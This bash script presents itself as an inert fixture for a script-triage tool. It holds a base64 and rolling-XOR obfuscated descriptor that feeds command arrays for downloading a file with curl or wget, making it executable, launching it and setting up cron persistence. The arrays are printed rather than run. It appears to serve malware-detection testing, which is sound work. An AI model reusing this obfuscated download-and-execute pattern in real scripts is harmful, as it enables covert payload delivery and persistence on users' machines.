#!/usr/bin/env bash

# Huntress Script Triage -- inert static-analysis fixture (bash_linux)

readonly Material_8daf0bae='naCR7Z7qj/+MscGz3LrTv9qF7YLxhanIq9qvxrTRjvyZ9JvviqbRo8q+24Tii+eCrs2lxKrNqPea9ZH02LzVpta3w6DIl+eV+pn8j/yA4YXklOCF98q92r/LlPWH5Iz''TtdS41LbXtN+j0KTFoseY+5Thj/vG84/sjeCQ8Zj/kc6nw/6d/JHhgOmO4M3/yKqe+8z8n6ee4pflibTcqNys3+XK5dfggrbT5NS3j7aY/YXkifmV8N632a/OosuvgL''mOt9Pl1eeBr9y0yL3Oq9mG54Dli//Civ+R5ZfygfK+372SoJf1waSTo8D4wb3bst675JT1genU+4/ikr3VoM66yK3erYDjguGJ7MPtnuqL7ImklqHD95KllfbO94vqm''PuTzLzOocOmm+6A4YzpxKnVpsOxx67NqPeZ+JXwzbjIrM253PHD9Jaix/DAo5uijP+a6J73lPGN7pzzncKy06fP8t24zK+A45H+kL7a9YDwlPWB5Mn7zK6a/8j4m6Oa'

readonly Codec_8daf0bae='base64_chunks|rolling_xor|eb'



Load_8daf0bae() {

  e=()

  local p

  while read -r p; do [[ -n "$p" ]] && e+=("$p"); done < <(printf '%s' "${Material_8daf0bae}" | base64 --decode | od -An -v -tu1 | tr -s ' ' '\n' | sed '/^$/d')

}



Decode_8daf0bae() {

  d=()

  local q=235

  local i

  for ((i=0; i<${#e[@]}; i++)); do

    d+=("$((e[i] ^ q))")

    q=${e[i]}

  done

}



Recover_8daf0bae() {

  local -a e d

  local t n z i

  n=''

  Load_8daf0bae

  z=0; while ((z < 1)); do Decode_8daf0bae; ((z+=1)); done

  t=''

  local octal character

  for i in "${!d[@]}"; do

    printf -v octal '%03o' "${d[i]}"

    printf -v character '%b' "\\$octal"

    t+="$character"

  done

  printf '%s\n' "$t"

}



Inspect_8daf0bae() { Recover_8daf0bae; }



Plan_8daf0bae() {

  local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''

  descriptor="$(Inspect_8daf0bae)"

  local -a fields

  IFS='|' read -r -a fields <<< "$descriptor"

  for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done

  local -a profile_command=(uname -m) request_primary=(curl --fail --silent --show-error -o "$file_path" "$url") request_fallback=(wget -qO "$file_path" "$url") permission_command=(chmod 0700 "$file_path") launch_command=("$file_path") cron_descriptor=(printf '%s' "$cron_path" "$service_name")

  declare -p profile_command request_primary request_fallback permission_command launch_command cron_descriptor

}



if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_8daf0bae; fi

